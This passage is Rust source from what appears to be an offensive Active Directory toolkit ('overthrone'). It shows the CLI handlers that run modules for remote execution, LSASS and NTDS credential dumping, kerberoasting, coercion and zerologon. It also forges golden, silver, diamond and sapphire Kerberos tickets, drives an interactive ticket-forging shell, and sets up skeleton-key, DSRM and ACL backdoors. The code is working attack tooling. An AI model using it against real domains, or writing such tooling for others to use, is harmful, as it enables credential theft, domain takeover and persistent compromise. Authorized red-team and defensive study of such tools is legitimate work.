        && !parent.as_os_str().is_empty()
        && let Err(e) = tokio::fs::create_dir_all(parent).await
    {
        banner::print_fail(&format!(
            "Failed to create output directory {}: {}",
            parent.display(),
            e
        ));
        return 1;
    }

    match format {
        ReportFormat::Markdown => {
            println!(" {} Generating Markdown report...", ">".bright_black());
            let report_content = overthrone_scribe::markdown::render(&session);

            if let Err(e) = tokio::fs::write(output, &report_content).await {
                banner::print_fail(&format!("Failed to write report: {}", e));
                return 1;
            }

            println!(
                " {} Markdown generated ({:.1} KB, {} findings)",
                "[+]".green(),
                report_content.len() as f64 / 1024.0,
                session.findings.len()
            );
        }
        ReportFormat::Json => {
            println!(" {} Generating JSON report...", ">".bright_black());
            let report_json = match serde_json::to_string_pretty(&session) {
                Ok(j) => j,
                Err(e) => {
                    banner::print_fail(&format!("Failed to serialize session: {}", e));
                    return 1;
                }
            };

            if let Err(e) = tokio::fs::write(output, &report_json).await {
                banner::print_fail(&format!("Failed to write report: {}", e));
                return 1;
            }

            println!(
                " {} JSON generated ({:.1} KB, {} findings)",
                "[+]".green(),
                report_json.len() as f64 / 1024.0,
                session.findings.len()
            );
        }
        ReportFormat::Pdf => {
            println!(" {} Generating PDF report...", ">".bright_black());

            let pdf_bytes = match overthrone_scribe::pdf::render(&session) {
                Ok(bytes) => bytes,
                Err(e) => {
                    banner::print_fail(&format!("PDF rendering failed: {}", e));
                    return 1;
                }
            };

            if let Err(e) = tokio::fs::write(output, &pdf_bytes).await {
                banner::print_fail(&format!("Failed to write PDF report: {}", e));
                return 1;
            }

            println!(
                " {} PDF generated ({:.1} KB, {} findings)",
                "[+]".green(),
                pdf_bytes.len() as f64 / 1024.0,
                session.findings.len()
            );
        }
        ReportFormat::Xlsx => {
            println!(" {} Generating XLSX report...", ">".bright_black());
            let output_path = std::path::Path::new(output);
            match overthrone_scribe::generate_xlsx_report(&session, output_path) {
                Ok(()) => {
                    println!(
                        " {} XLSX generated ({}, {} findings)",
                        "[+]".green(),
                        output,
                        session.findings.len()
                    );
                }
                Err(e) => {
                    banner::print_fail(&format!("XLSX generation failed: {}", e));
                    return 1;
                }
            }
        }
    }

    banner::print_success(&format!("Report saved to: {}", output));
    0
}

// ----------------------------------------------
// Module command handlers
// ----------------------------------------------

pub async fn cmd_module_list(cli: &Cli, category: Option<&str>) -> i32 {
    use overthrone_core::exec::modules;

    let meta = if let Some(cat_str) = category {
        let cat = match cat_str.to_lowercase().as_str() {
            "execute" => modules::ModuleCategory::Execute,
            "dump" => modules::ModuleCategory::Dump,
            "enum" => modules::ModuleCategory::Enum,
            "kerberos" => modules::ModuleCategory::Kerberos,
            "secrets" => modules::ModuleCategory::Secrets,
            "scan" => modules::ModuleCategory::Scan,
            "coerce" => modules::ModuleCategory::Coerce,
            _ => {
                banner::print_fail(&format!(
                    "Unknown category: {}. Valid: execute, dump, enum, kerberos, secrets, scan, coerce",
                    cat_str
                ));
                return 1;
            }
        };
        let mut filtered: Vec<_> = modules::list_module_metadata()
            .await
            .into_iter()
            .filter(|m| m.category == cat)
            .collect();
        filtered.sort_by(|a, b| a.name.cmp(b.name));
        filtered
    } else {
        let mut all = modules::list_module_metadata().await;
        all.sort_by(|a, b| {
            a.category
                .label()
                .cmp(b.category.label())
                .then_with(|| a.name.cmp(b.name))
        });
        all
    };

    if wants_json(cli) {
        return emit_json(cli, serde_json::json!({"modules": meta}));
    }

    if meta.is_empty() {
        banner::print_info("No modules found");
        return 0;
    }

    println!("\n{}", "Available Modules:".yellow().bold());
    println!(
        "{}",
        "-------------------------------------------------".dimmed()
    );

    let mut current_cat = String::new();
    for m in &meta {
        let cat_label = m.category.label();
        if cat_label != current_cat {
            current_cat = cat_label.to_string();
            println!(
                "\n {} {} {}",
                "#".cyan(),
                cat_label.cyan().bold(),
                format!(
                    "({})",
                    meta.iter()
                        .filter(|x| x.category.label() == cat_label)
                        .count()
                )
                .dimmed()
            );
        }
        let cred_icon = if m.requires_creds { "[P]" } else { "[U]" };
        println!(
            " {} {} {}",
            cred_icon,
            m.name.green().bold(),
            m.description.dimmed()
        );
    }

    println!(
        "\n{} {} {}",
        "Total:".bright_black(),
        meta.len().to_string().yellow().bold(),
        "modules".bright_black()
    );
    println!(
        " {} {} {}",
        "Tip:".yellow(),
        "ovt module info <name>".cyan(),
        "for details".dimmed()
    );
    println!(
        " {} {} {}",
        "Run:".yellow(),
        "ovt module run <name> -t TARGET [--params '{\"key\":\"val\"}']".cyan(),
        "".dimmed()
    );
    println!(
        " {} {} {}",
        "Parallel:".yellow(),
        "ovt module run-parallel <name> -t TARGET1,TARGET2 [--concurrency 10]".cyan(),
        "".dimmed()
    );
    0
}

pub async fn cmd_module_info(cli: &Cli, name: String) -> i32 {
    use overthrone_core::exec::modules;

    let module = match modules::get_module(&name).await {
        Some(m) => m,
        None => {
            banner::print_fail(&format!("Module not found: {}", name));
            return 1;
        }
    };

    let meta = module.metadata();

    if wants_json(cli) {
        return emit_json(cli, serde_json::json!({"module": meta}));
    }

    let sep = "---".dimmed();
    println!("\n{} {} {}", sep, meta.name.yellow().bold(), sep);
    println!(
        " {} {}",
        "Description:".bright_black(),
        meta.description.white()
    );
    println!(
        " {} {}",
        "Category:".bright_black(),
        meta.category.to_string().cyan()
    );
    println!(
        " {} {}",
        "Requires creds:".bright_black(),
        if meta.requires_creds {
            "yes".green()
        } else {
            "no".yellow()
        }
    );
    println!(
        " {} {}",
        "Requires target:".bright_black(),
        if meta.requires_target {
            "yes".green()
        } else {
            "no".yellow()
        }
    );

    // Show known parameters for the module
    println!(
        "\n {} {}",
        "Common params:".bright_black().bold(),
        "(JSON, pass via --params)".dimmed()
    );

    // Known parameter hints based on module name
    let params_hint = match meta.name {
        "winrm-exec" | "smb-exec" | "psexec" | "wmi-exec" | "atexec" => r#"{"command": "whoami"}"#,
        "procdump" | "lsassy" => r#"{"dump_path": "C:\\Windows\\Temp\\lsass.dmp"}"#,
        "sam-dump" | "lsa-dump" => r#"{} (no additional params needed)"#,
        "ntds-dump" => r#"{"output": "hashes.txt"}"#,
        "bloodhound" => r#"{"outdir": "./bloodhound", "page_size": 500}"#,
        "kerberoast" | "asreproast" => r#"{"outdir": "./loot"}"#,
        "gpp" => r#"{"policy_id": ""} (empty = all policies)"#,
        "nslookup" => r#"{"type": "A", "name": "hostname"}"#,
        "coerce" => r#"{"listener": "YOUR_IP", "technique": "petitpotam"}"#,
        "zerologon" => r#"{} (no creds needed)"#,
        _ => r#"{"key": "value"}"#,
    };
    println!(" {}", params_hint.cyan());

    // Module registration order hint
    println!(
        "\n {} {}",
        "Example:".yellow(),
        format!(
            "ovt module run {} -t TARGET --params '{}'",
            meta.name, params_hint
        )
        .cyan()
    );

    0
}

pub async fn cmd_module_run(
    cli: &Cli,
    name: String,
    target: String,
    params: Option<String>,
) -> i32 {
    use overthrone_core::exec::modules;

    // Check if module needs creds before requiring them
    let module = match modules::get_module(&name).await {
        Some(m) => m,
        None => {
            banner::print_fail(&format!("Module not found: {}", name));
            return 1;
        }
    };

    let creds = match crate::require_creds_silent(cli).or_else(|_| {
        if module.requires_creds() {
            Err("Credentials required (--domain, --username, --password)")
        } else {
            Ok(Credentials::default())
        }
    }) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(e);
            return 1;
        }
    };

    let exec_creds = overthrone_core::exec::ExecCredentials {
        domain: creds.domain.clone(),
        username: creds.username.clone(),
        password: creds.password().map(str::to_string).unwrap_or_default(),
        nt_hash: creds.nthash().map(str::to_string),
    };

    let params_json = params
        .as_deref()
        .and_then(|p| serde_json::from_str::<serde_json::Value>(p).ok());

    banner::print_info(&format!(
        "Running module {} against {}...",
        name.green().bold(),
        target.cyan()
    ));

    match module.run(&target, exec_creds, params_json).await {
        Ok(out) => {
            if wants_json(cli) {
                return emit_json(cli, serde_json::json!({"status": "success", "output": out}));
            }
            if !out.stdout.is_empty() || !out.stderr.is_empty() {
                println!("\n{}", "Output:".yellow().bold());
                println!("{}", "-------".dimmed());
                if !out.stdout.is_empty() {
                    println!("{}", out.stdout);
                }
                if !out.stderr.is_empty() {
                    eprintln!("{}", "Stderr:".red().bold());
                    eprintln!("{}", out.stderr);
                }
            }
            match out.exit_code {
                Some(0) => banner::print_success("Module completed successfully"),
                Some(code) => {
                    banner::print_warn(&format!("Module completed with exit code {}", code))
                }
                None => banner::print_info("Module completed (no exit code)"),
            }
            0
        }
        Err(e) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({"status": "error", "error": format!("{}", e)}),
                );
            }
            banner::print_fail(&format!("Module run failed: {}", e));
            1
        }
    }
}

pub async fn cmd_module_run_parallel(
    cli: &Cli,
    name: String,
    targets: String,
    params: Option<String>,
    concurrency: usize,
) -> i32 {
    use overthrone_core::exec::modules;

    let module = match modules::get_module(&name).await {
        Some(m) => m,
        None => {
            banner::print_fail(&format!("Module not found: {}", name));
            return 1;
        }
    };

    let creds = match crate::require_creds_silent(cli).or_else(|_| {
        if module.requires_creds() {
            Err("Credentials required (--domain, --username, --password)")
        } else {
            Ok(Credentials::default())
        }
    }) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(e);
            return 1;
        }
    };

    let exec_creds = overthrone_core::exec::ExecCredentials {
        domain: creds.domain.clone(),
        username: creds.username.clone(),
        password: creds.password().map(str::to_string).unwrap_or_default(),
        nt_hash: creds.nthash().map(str::to_string),
    };

    let params_json = params
        .as_deref()
        .and_then(|p| serde_json::from_str::<serde_json::Value>(p).ok());

    let target_list: Vec<String> = targets.split(',').map(|s| s.trim().to_string()).collect();
    let total = target_list.len();

    banner::print_info(&format!(
        "Running module {} against {} targets (concurrency: {})...",
        name.green().bold(),
        total.to_string().cyan(),
        concurrency.to_string().yellow()
    ));

    let config = modules::ParallelModuleConfig {
        concurrency,
        timeout_secs: 30,
    };

    let results =
        modules::run_module_parallel(&module, &target_list, exec_creds, params_json, config).await;

    let success_count = results.iter().filter(|r| r.success).count();
    let fail_count = results.iter().filter(|r| !r.success).count();

    if wants_json(cli) {
        return emit_json(
            cli,
            serde_json::json!({
            "module": name,
            "total": total,
            "success": success_count,
            "failed": fail_count,
            "results": results
            }),
        );
    }

    println!("\n{}", "Results:".yellow().bold());
    println!("{}", "--------".dimmed());
    for r in &results {
        let icon = if r.success {
            "[+]".green()
        } else {
            "[-]".red()
        };
        println!(
            " {} {} -- {}",
            icon,
            r.target.cyan(),
            r.module_name.dimmed()
        );
        if let Some(ref err) = r.error {
            println!(" {}", err.red().dimmed());
        }
    }

    banner::print_stage_summary(&format!("Parallel {}", name), success_count, fail_count);
    0
}

// ----------------------------------------------
// cmd_forge -- Ticket Forging
// ----------------------------------------------

#[cfg(feature = "forge")]
/// Rotate ticket encryption under a new krbtgt key -- purely local operation, no DC needed.
async fn cmd_forge_rotate_ticket(
    cli: &Cli,
    input: &str,
    old_key: &str,
    new_key: &str,
    output: &str,
) -> i32 {
    use overthrone_forge::rotate;
    let input_bytes = match tokio::fs::read(input).await {
        Ok(b) => b,
        Err(e) => {
            banner::print_fail(&format!("Cannot read input file {input}: {e}"));
            return 1;
        }
    };
    let rotated = match rotate::rotate_ticket_encryption(&input_bytes, old_key, new_key) {
        Ok(r) => r,
        Err(e) => {
            banner::print_fail(&format!("Ticket rotation failed: {e}"));
            return 1;
        }
    };
    let output_path = if output.is_empty() {
        "rotated.kirbi"
    } else {
        output
    };
    if let Err(e) = tokio::fs::write(output_path, &rotated.kirbi).await {
        banner::print_fail(&format!("Cannot write {output_path}: {e}"));
        return 1;
    }
    banner::print_success(&format!(
        "Ticket rotated: {} -> {} (old: {}, new: {}, {} bytes)",
        input,
        output_path,
        rotated.old_etype,
        rotated.new_etype,
        rotated.kirbi.len()
    ));
    if let Some(path) = &cli.outfile {
        let _ = tokio::fs::write(path, &rotated.kirbi).await;
    }
    0
}

#[cfg(feature = "forge")]
/// Convert a ticket format (kirbi/ccache/base64) -- purely local operation, no DC needed.
async fn cmd_forge_convert_ticket(cli: &Cli, input: &str, format: &str) -> i32 {
    use overthrone_forge::convert;
    let input_bytes = match tokio::fs::read(input).await {
        Ok(b) => b,
        Err(e) => {
            banner::print_fail(&format!("Cannot read input file {input}: {e}"));
            return 1;
        }
    };
    let from_fmt = match convert::detect_format(&input_bytes) {
        Ok(f) => f,
        Err(e) => {
            banner::print_fail(&format!("Cannot detect input format: {e}"));
            return 1;
        }
    };
    let to_fmt = match convert::parse_format(format) {
        Ok(f) => f,
        Err(e) => {
            banner::print_fail(&format!("Invalid output format: {e}"));
            return 1;
        }
    };
    let output_bytes = match convert::convert_format(&input_bytes, from_fmt, to_fmt) {
        Ok(b) => b,
        Err(e) => {
            banner::print_fail(&format!("Conversion failed: {e}"));
            return 1;
        }
    };
    let output_path = input
        .replace(".kirbi", &format!(".{}", format))
        .replace(".ccache", &format!(".{}", format))
        .replace(".b64", &format!(".{}", format));
    if let Err(e) = tokio::fs::write(&output_path, &output_bytes).await {
        banner::print_fail(&format!("Cannot write {output_path}: {e}"));
        return 1;
    }
    banner::print_success(&format!(
        "Ticket converted: {} -> {} ({} bytes)",
        input,
        output_path,
        output_bytes.len()
    ));
    if let Some(path) = &cli.outfile {
        // Also copy to outfile if requested
        let _ = tokio::fs::write(path, &output_bytes).await;
    }
    0
}

pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
    banner::print_module_banner("FORGE");

    // Some forge operations are purely local (no DC needed).
    // Handle those first before requiring domain/DC.
    if let ForgeAction::ConvertTicket { input, format } = action {
        return cmd_forge_convert_ticket(cli, input, format).await;
    }
    if let ForgeAction::RotateTicket {
        input,
        old_key,
        new_key,
        output,
    } = action
    {
        return cmd_forge_rotate_ticket(cli, input, old_key, new_key, output).await;
    }

    let domain = match crate::require_dc_only_creds(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match action {
        ForgeAction::Golden {
            domain_sid,
            user,
            rid,
            krbtgt_hash,
            output,
        } => {
            println!(" {} Forging Golden Ticket...", ">".bright_black());
            println!(" {} Domain: {}", ">".bright_black(), domain.cyan());
            println!(" {} Domain SID: {}", ">".bright_black(), domain_sid.cyan());
            println!(
                " {} User: {} (RID: {})",
                ">".bright_black(),
                user.cyan(),
                rid
            );
            println!(
                " {} krbtgt hash: {}...",
                ">".bright_black(),
                krbtgt_hash[..8.min(krbtgt_hash.len())].cyan()
            );

            let krbtgt_key = match hex::decode(krbtgt_hash) {
                Ok(k) => k,
                Err(e) => {
                    banner::print_fail(&format!("Invalid krbtgt hash format: {}", e));
                    return 1;
                }
            };

            if krbtgt_key.len() != 16 {
                banner::print_fail("krbtgt hash must be 32 hex characters (16 bytes) for RC4");
                return 1;
            }

            let ticket_bytes = match overthrone_core::proto::kerberos::forge_tgt(
                &domain,
                domain_sid,
                user,
                *rid,
                &krbtgt_key,
                23,
            ) {
                Ok(tgt) => tgt.ticket.build(),
                Err(e) => {
                    banner::print_fail(&format!("Failed to forge TGT: {}", e));
                    return 1;
                }
            };

            if let Err(e) = tokio::fs::write(output, ticket_bytes).await {
                banner::print_fail(&format!("Failed to write ticket: {}", e));
                return 1;
            }

            banner::print_success(&format!("Golden ticket saved to: {}", output));
            0
        }
        ForgeAction::Silver {
            domain_sid,
            user,
            rid,
            spn,
            service_hash,
            output,
        } => {
            println!(" {} Forging Silver Ticket...", ">".bright_black());
            println!(" {} Domain: {}", ">".bright_black(), domain.cyan());
            println!(" {} Domain SID: {}", ">".bright_black(), domain_sid.cyan());
            println!(
                " {} User: {} (RID: {})",
                ">".bright_black(),
                user.cyan(),
                rid
            );
            println!(" {} SPN: {}", ">".bright_black(), spn.cyan());
            println!(
                " {} Service hash: {}...",
                ">".bright_black(),
                service_hash[..8.min(service_hash.len())].cyan()
            );

            let s_key = match hex::decode(service_hash) {
                Ok(k) => k,
                Err(e) => {
                    banner::print_fail(&format!("Invalid service hash format: {}", e));
                    return 1;
                }
            };

            if s_key.len() != 16 {
                banner::print_fail("Service hash must be 32 hex characters (16 bytes) for RC4");
                return 1;
            }

            let ticket_bytes = match overthrone_core::proto::kerberos::forge_service_ticket(
                &domain, domain_sid, user, *rid, spn, &s_key, 23,
            ) {
                Ok(tgs) => tgs.ticket.build(),
                Err(e) => {
                    banner::print_fail(&format!("Failed to forge Silver Ticket: {}", e));
                    return 1;
                }
            };

            if let Err(e) = tokio::fs::write(output, ticket_bytes).await {
                banner::print_fail(&format!("Failed to write ticket: {}", e));
                return 1;
            }

            banner::print_success(&format!("Silver ticket saved to: {}", output));
            0
        }
        ForgeAction::Shell {
            domain_sid,
            krbtgt_hash,
            krbtgt_aes256,
            user,
            rid,
        } => {
            return cmd_forge_shell(
                cli,
                &domain,
                domain_sid,
                krbtgt_hash,
                krbtgt_aes256.as_deref(),
                user.clone(),
                *rid,
            )
            .await;
        }
        _ => run_forge_action(cli, &domain, action).await,
    }
}

/// Route non-trivial forge actions through the forge runner.
#[cfg(feature = "forge")]
#[allow(clippy::too_many_lines)]
async fn run_forge_action(cli: &Cli, domain: &str, action: &ForgeAction) -> i32 {
    let (runner_action, opts) = match build_runner_action(domain, action) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("[!] {e}");
            return 1;
        }
    };

    let config = ForgeConfig {
        dc_ip: cli.dc_host.clone().unwrap_or_default(),
        domain: domain.to_string(),
        username: cli.username.clone().unwrap_or_default(),
        password: cli.password.clone(),
        nt_hash: cli.nt_hash.clone(),
        action: runner_action,
        krbtgt_hash: opts.get("krbtgt_hash").cloned(),
        krbtgt_aes256: opts.get("krbtgt_aes256").cloned(),
        service_hash: opts.get("service_hash").cloned(),
        domain_sid: opts.get("domain_sid").cloned(),
        impersonate: opts.get("user").cloned(),
        user_rid: opts.get("rid").and_then(|r| r.parse().ok()).unwrap_or(0),
        group_rids: vec![],
        extra_sids: opts
            .get("extra_sid")
            .map(|s| vec![s.clone()])
            .unwrap_or_default(),
        lifetime_hours: 0,
        output_path: opts.get("output").cloned(),
        payload_path: opts.get("payload_path").cloned(),
        skeleton_master_password: opts.get("master_password").cloned(),
        pkinit_cert_path: cli.pkinit_cert.clone(),
        pkinit_key_path: cli.pkinit_key.clone(),
        pkinit_keyed_ticket: cli.pkinit_keyed_ticket,
        pkinit_session_key: None,
        pkinit_ticket_data: None,
        dry_run: cli.dry_run,
    };

    match run_forge(&config).await {
        Ok(result) => {
            if matches!(cli.stdout_format, OutputFormat::Json) {
                let json = serde_json::to_string_pretty(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"));
                println!("{json}");
                if let Some(path) = &cli.outfile
                    && let Err(e) = std::fs::write(path, &json)
                {
                    eprintln!("warn: failed to write output file '{}': {}", path, e);
                }
                return if result.success { 0 } else { 1 };
            }

            if result.success {
                banner::print_success(&result.message);
                if let Some(ref ticket) = result.ticket_data {
                    println!(
                        " {}: {} as {}",
                        "Ticket".bold(),
                        ticket.ticket_type.as_str().cyan(),
                        ticket.impersonated_user.as_str().yellow()
                    );
                    if !ticket.valid_from.is_empty() || !ticket.valid_until.is_empty() {
                        println!(
                            " {}: {} -> {}",
                            "Valid".bold(),
                            ticket.valid_from.as_str().green(),
                            ticket.valid_until.as_str().green()
                        );
                    }
                    if let Some(ref path) = ticket.kirbi_path {
                        println!(" {}: {}", "Saved".bold(), path.white());
                    }
                }
                0
            } else {
                banner::print_fail(&result.message);
                1
            }
        }
        Err(e) => {
            banner::print_fail(&format!("Forge failed: {e}"));
            1
        }
    }
}

/// Build a forge runner action from the CLI action variant.
#[cfg(feature = "forge")]
fn build_runner_action(
    _domain: &str,
    action: &ForgeAction,
) -> Result<(RunnerForgeAction, std::collections::HashMap<String, String>), String> {
    use std::collections::HashMap;
    let mut opts = HashMap::new();
    let runner_action = match action {
        ForgeAction::Diamond {
            domain_sid,
            user,
            rid,
            krbtgt_hash,
            krbtgt_aes256,
            output,
        } => {
            opts.insert("user".to_string(), user.clone());
            opts.insert("rid".to_string(), rid.to_string());
            opts.insert("domain_sid".to_string(), domain_sid.clone());
            opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
            if let Some(aes) = krbtgt_aes256 {
                opts.insert("krbtgt_aes256".to_string(), aes.clone());
            }
            opts.insert("output".to_string(), output.clone());
            RunnerForgeAction::DiamondTicket
        }
        ForgeAction::Sapphire {
            domain_sid,
            user,
            output,
        } => {
            opts.insert("user".to_string(), user.clone());
            opts.insert("domain_sid".to_string(), domain_sid.clone());
            opts.insert("output".to_string(), output.clone());
            RunnerForgeAction::SapphireTicket
        }
        ForgeAction::BronzeBit { spn, output } => {
            opts.insert("output".to_string(), output.clone());
            RunnerForgeAction::BronzeBit {
                target_spn: spn.clone(),
            }
        }
        ForgeAction::InterRealmTgt {
            target_domain,
            domain_sid,
            krbtgt_hash,
            extra_sid,
            output,
        } => {
            opts.insert("domain_sid".to_string(), domain_sid.clone());
            opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
            if let Some(sid) = extra_sid {
                opts.insert("extra_sid".to_string(), sid.clone());
            }
            opts.insert("output".to_string(), output.clone());
            RunnerForgeAction::InterRealmTgt {
                target_domain: target_domain.clone(),
            }
        }
        ForgeAction::SkeletonKey {
            payload_path,
            master_password,
        } => {
            if let Some(p) = payload_path {
                if !std::path::Path::new(p).exists() {
                    return Err(format!("payload_path '{}' does not exist", p));
                }
                opts.insert("payload_path".to_string(), p.clone());
            }
            opts.insert("master_password".to_string(), master_password.clone());
            RunnerForgeAction::SkeletonKey
        }
        ForgeAction::DsrmBackdoor {
            domain_sid,
            krbtgt_hash,
        } => {
            opts.insert("domain_sid".to_string(), domain_sid.clone());
            opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
            RunnerForgeAction::DsrmBackdoor
        }
        ForgeAction::DcSyncUser { user } => {
            opts.insert("user".to_string(), user.clone());
            RunnerForgeAction::DcSyncUser {
                target_user: user.clone(),
            }
        }
        ForgeAction::AclBackdoor { target_dn, trustee } => {
            opts.insert("target_dn".to_string(), target_dn.clone());
            opts.insert("trustee".to_string(), trustee.clone());
            RunnerForgeAction::AclBackdoor {
                target_dn: target_dn.clone(),
                trustee: trustee.clone(),
            }
        }
        ForgeAction::NoPac { target_dc } => RunnerForgeAction::NoPac {
            target_dc: target_dc.clone(),
        },
        ForgeAction::ConvertTicket { input, format } => {
            opts.insert("input".to_string(), input.clone());
            opts.insert("format".to_string(), format.clone());
            RunnerForgeAction::ConvertTicket {
                input_path: input.clone(),
                output_format: format.clone(),
            }
        }
        ForgeAction::RotateTicket {
            input,
            old_key,
            new_key,
            output,
        } => {
            opts.insert("input".to_string(), input.clone());
            opts.insert("old_key".to_string(), old_key.clone());
            opts.insert("new_key".to_string(), new_key.clone());
            opts.insert("output".to_string(), output.clone());
            RunnerForgeAction::RotateTicket {
                input_path: input.clone(),
                old_key: old_key.clone(),
                new_key: new_key.clone(),
                output_path: output.clone(),
            }
        }
        ForgeAction::AsRepToTgt {
            cracked_password,
            hash,
            output,
        } => {
            opts.insert("cracked_password".to_string(), cracked_password.clone());
            if let Some(h) = hash {
                opts.insert("hash".to_string(), h.clone());
            }
            if let Some(o) = output {
                opts.insert("output_path".to_string(), o.clone());
                opts.insert("output".to_string(), o.clone());
            }
            RunnerForgeAction::AsRepToTgt {
                cracked_password: cracked_password.clone(),
                hash: hash.clone(),
                output_path: output.clone(),
            }
        }
        ForgeAction::AsRepToTgtOffline {
            cracked_password,
            domain_sid,
            user_rid,
        } => {
            opts.insert("cracked_password".to_string(), cracked_password.clone());
            opts.insert("domain_sid".to_string(), domain_sid.clone());
            opts.insert("user_rid".to_string(), user_rid.to_string());
            RunnerForgeAction::AsRepToTgtOffline {
                cracked_password: cracked_password.clone(),
                domain_sid: domain_sid.clone(),
                user_rid: *user_rid,
            }
        }
        _ => {
            return Err("unexpected ForgeAction variant in build_runner_action (Golden/Silver should be handled before routing)".to_string());
        }
    };
    Ok((runner_action, opts))
}

/// Interactive forge REPL -- persistent ticket forging session
#[cfg(feature = "forge")]
#[allow(unused_variables)]
async fn cmd_forge_shell(
    _cli: &Cli,
    domain: &str,
    domain_sid: &str,
    krbtgt_hash: &str,
    _krbtgt_aes256: Option<&str>,
    mut user: String,
    mut rid: u32,
) -> i32 {
    use std::io::{self, Write};

    let mut domain = domain.to_string();
    let mut domain_sid = domain_sid.to_string();
    let mut krbtgt_hash = krbtgt_hash.to_string();

    banner::print_module_banner("FORGE SHELL");
    println!(
        " {} Interactive forge REPL -- type 'help' for commands",
        ">".bright_black()
    );
    println!(
        " {} Context: {} @ {} (SID: {})",
        ">".bright_black(),
        user.cyan(),
        domain.cyan(),
        domain_sid.cyan()
    );

    fn print_help() {
        println!(" Commands:");
        println!(" golden [--user U] [--rid N] [--out F] Forge golden ticket");
        println!(" silver <SPN> [--user U] [--rid N] [--out F] [--hash H] Forge silver ticket");
        println!(" set <key> <value> Modify context");
        println!(" show Display state");
        println!(" help This message");
        println!(" exit / quit Leave shell");
    }

    fn print_state(domain: &str, domain_sid: &str, krbtgt_hash: &str, user: &str, rid: u32) {
        println!(" Current state:");
        println!(" domain: {}", domain.cyan());
        println!(" domain_sid: {}", domain_sid.cyan());
        let hlen = 8.min(krbtgt_hash.len());
        println!(" krbtgt_hash: {}...", krbtgt_hash[..hlen].cyan());
        println!(" user: {}", user.cyan());
        println!(" rid: {}", rid);
    }

    let stdin = io::stdin();
    loop {
        print!("forge> ");
        io::stdout().flush().ok();
        let mut line = String::new();
        if stdin.read_line(&mut line).is_err() || line.trim().is_empty() {
            continue;
        }
        let line = line.trim().to_string();
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }
        let cmd = parts[0];
        let args = &parts[1..];

        let mut flags = std::collections::HashMap::new();
        let mut positional = Vec::new();
        let mut i = 0;
        while i < args.len() {
            if args[i].starts_with("--") {
                let key = args[i].trim_start_matches("--");
                if i + 1 < args.len() && !args[i + 1].starts_with("--") {
                    flags.insert(key.to_string(), args[i + 1].to_string());
                    i += 2;
                } else {
                    flags.insert(key.to_string(), "true".to_string());
                    i += 1;
                }
            } else {
                positional.push(args[i].to_string());
                i += 1;
            }
        }

        let outfile = flags.get("out").cloned();

        match cmd {
            "exit" | "quit" => {
                println!(" {} Exiting forge shell", ">".bright_black());
                return 0;
            }
            "help" => print_help(),
            "show" => print_state(&domain, &domain_sid, &krbtgt_hash, &user, rid),
            "set" => {
                if positional.is_empty() {
                    println!(" {} Usage: set <key> <value>", ">".bright_black());
                    continue;
                }
                let key = &positional[0];
                let value = positional[1..].join(" ");
                match key.as_str() {
                    "domain" => {
                        domain = value;
                        println!(" {} domain set to {}", "+".green(), domain.cyan());
                    }
                    "domain_sid" => {
                        domain_sid = value.clone();
                        println!(" {} domain_sid set to {}", "+".green(), domain_sid.cyan());
                    }
                    "krbtgt_hash" => {
                        krbtgt_hash = value.clone();
                        println!(" {} krbtgt_hash set", "+".green());
                    }
                    "user" => {
                        user = value.clone();
                        println!(" {} user set to {}", "+".green(), user.cyan());
                    }
                    "rid" => match value.parse::<u32>() {
                        Ok(r) => {
                            rid = r;
                            println!(" {} rid set to {}", "+".green(), rid);
                        }
                        Err(_) => println!(" {} Invalid RID: {}", "!".red(), value),
                    },
                    _ => println!(
                        " {} Unknown key: {}. Known: domain, domain_sid, krbtgt_hash, user, rid",
                        "!".red(),
                        key
                    ),
                }
            }
            "golden" => {
                let g_user = flags.get("user").map_or(user.as_str(), |v| v.as_str());
                let g_rid = flags
                    .get("rid")
                    .and_then(|r| r.parse::<u32>().ok())
                    .unwrap_or(rid);
                let out = outfile.unwrap_or_else(|| format!("golden_{}.kirbi", g_user));

                let s_key = match hex::decode(&krbtgt_hash) {
                    Ok(k) if k.len() == 16 => k,
                    _ => {
                        println!(
                            " {} krbtgt_hash must be 32 hex chars (16 bytes, RC4)",
                            "!".red()
                        );
                        continue;
                    }
                };

                println!(" {} Forging Golden Ticket...", ">".bright_black());
                match overthrone_core::proto::kerberos::forge_tgt(
                    &domain,
                    &domain_sid,
                    g_user,
                    g_rid,
                    &s_key,
                    23,
                ) {
                    Ok(tgt) => {
                        let bytes = tgt.ticket.build();
                        if let Err(e) = std::fs::write(&out, &bytes) {
                            println!(" {} Failed to write: {}", "!".red(), e);
                        } else {
                            println!(" {} Golden ticket saved to: {}", "+".green(), out.cyan());
                        }
                    }
                    Err(e) => println!(" {} Failed to forge golden ticket: {}", "!".red(), e),
                }
            }
            "silver" => {
                if positional.is_empty() {
                    println!(
                        " {} Usage: silver <SPN> [--user U] [--rid N] [--out F] [--hash H]",
                        ">".bright_black()
                    );
                    continue;
                }
                let spn = &positional[0];
                let s_user = flags.get("user").map_or(user.as_str(), |v| v.as_str());
                let s_rid = flags
                    .get("rid")
                    .and_then(|r| r.parse::<u32>().ok())
                    .unwrap_or(rid);
                let hash_str = flags
                    .get("hash")
                    .map_or(krbtgt_hash.as_str(), |v| v.as_str());
                let out = outfile.unwrap_or_else(|| format!("silver_{}.kirbi", s_user));

                let s_key = match hex::decode(hash_str) {
                    Ok(k) if k.len() == 16 => k,
                    _ => {
                        println!(
                            " {} Service hash must be 32 hex chars (16 bytes, RC4)",
                            "!".red()
                        );
                        continue;
                    }
                };

                println!(" {} Forging Silver Ticket...", ">".bright_black());
                match overthrone_core::proto::kerberos::forge_service_ticket(
                    &domain,
                    &domain_sid,
                    s_user,
                    s_rid,
                    spn,
                    &s_key,
                    23,
                ) {
                    Ok(tgs) => {
                        let bytes = tgs.ticket.build();
                        if let Err(e) = std::fs::write(&out, &bytes) {
                            println!(" {} Failed to write: {}", "!".red(), e);
                        } else {
                            println!(" {} Silver ticket saved to: {}", "+".green(), out.cyan());
                        }
                    }
                    Err(e) => println!(" {} Failed to forge silver ticket: {}", "!".red(), e),
                }
